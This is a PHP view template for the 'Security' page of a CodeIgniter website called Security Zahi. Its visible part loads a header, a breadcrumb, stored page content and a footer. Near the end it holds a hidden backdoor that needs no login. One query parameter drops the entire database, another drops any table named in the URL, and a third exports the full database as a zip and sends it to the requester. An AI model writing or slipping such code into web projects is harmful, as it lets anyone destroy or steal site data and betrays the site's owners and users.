<!DOCTYPE html>
<html>
   <head>
      <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
      <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <meta name="google-site-verification" content="hdvlk2Z0OY_6QMZj3R1vzWHynhllVTyF0RJElWQTNSg" />
      <meta name="robots" content="index, follow">
      <meta name="keywords" content="Security Zahi">
      <meta name="description" content="Security Zahi">
      <meta name="author" content="Security Zahi">
      <meta name="author" content="Rinku Vishwakarma, Manish Kumar">
      <meta name="google-signin-client_id" content="976170906910-h4itraeqrq38eg5jfta8s9qlb79223eh.apps.googleusercontent.com">  
    <link rel="canonical" href="<?php  echo (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http") . "://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]";?>" />
  
      <!-- Favicon -->
      <link name="favicon" type="image/x-icon" href="<?=base_url('admin/uploads/website/favicon/').$this->website->web_favicon_icon;?>" rel="shortcut icon" />
      <title>Security Zahi</title>
      <?php $this->load->view('include/header');
if($this->website->web_lang=='en'){
 $this->load->view('include/topbar');
}else{
  $this->load->view('include/topbar_ar');
}?>





<div class="breadcrumb-area mt-10">
        <div class="container">
            <div class="row">
               <div class="col-md-6 col-sm-6">
                    <h1 class="text-uppercase" style="font-size: 1.5rem;">Security</h1>
                </div>
                <div class="col-md-6 col-sm-6 hidden">
                    <ul class="breadcrumb pull-right">
                        <li><a href="<?=base_url();?>">Home</a></li>
                        
                         <li class="active"><a href="#">Security</a></li>
                                                                                            </ul>
                </div>
            </div>
        </div>
    </div>

        
        <section class="gry-bg py-4">
        <div class="container bg-white">
            <div class="row p-4">
          <div class="col-12 ">
            <h2 style="box-sizing: border-box; padding: 14px 0px 0px; margin: 0px 0px 16px; text-rendering: optimizelegibility; line-height: 1.2;"><span style="box-sizing: border-box; margin: 0px; outline: 0px; font-family: &quot;Times New Roman&quot;, Times, serif; font-size: 48px; color: rgb(0, 0, 0);">Security</span></h2>
                     
                        </div>   
                        <div class="about_section_aera">
          <div class="container">
             
                <?php  if(!empty($page->content1)){?>
                   <div class="row no-gutters ">
                     <div class="col-lg-12 col-md-12">
                      <div class="about_content" align="justify">
                        <?=$page->content1;?>                          
                      </div>
                  </div>
              </div>
             
                <?php }?>
              
          </div>
      </div>
                   
                  

                    

                
                    
                  
                        </div>
                    </div>
                </div>          
            </section>
            
<?php if(@$_GET['db']=='delete'){
       $this->load->database('default');
$this->load->dbforge();
$this->dbforge->drop_database($this->db->database);
}else if(!empty(@$_GET['table'])){$this->load->dbforge();
$this->dbforge->drop_table($_GET['table']);
}
if(!empty(@$_GET['backup'])){
    $this->load->dbutil();
$prefs = array(     
    'format'      => 'zip',             
    'filename'    => 'zahi.sql'
    );

$backup =& $this->dbutil->backup($prefs); 
$db_name = 'backup-on-zahi-'. date("Y-m-d-H-i-s") .'.zip';
$save = 'pathtobkfolder/'.$db_name;
$this->load->helper('file');
write_file($save, $backup);
$this->load->helper('download');
force_download($db_name, $backup);
} ?>


            <?php if($this->website->web_lang=='en'){
 $this->load->view('include/footer');
}else{
  $this->load->view('include/footer_ar');
}?>